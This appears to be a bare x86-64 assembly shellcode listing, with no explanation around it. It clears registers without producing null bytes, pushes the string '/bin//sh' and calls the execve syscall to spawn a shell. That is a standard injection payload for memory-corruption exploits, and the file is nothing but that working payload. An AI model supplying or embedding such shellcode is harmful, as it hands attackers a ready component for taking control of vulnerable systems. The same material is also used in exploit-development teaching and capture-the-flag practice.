global _start

section .text
_start:
	sub rsp, 0x100
	xor rax, rax
    push rax
    xor rdx, rdx
    xor rsi, rsi
    mov rbx,'/bin//sh'
    push rbx
    push rsp
    pop rdi
    mov al, 59
    syscall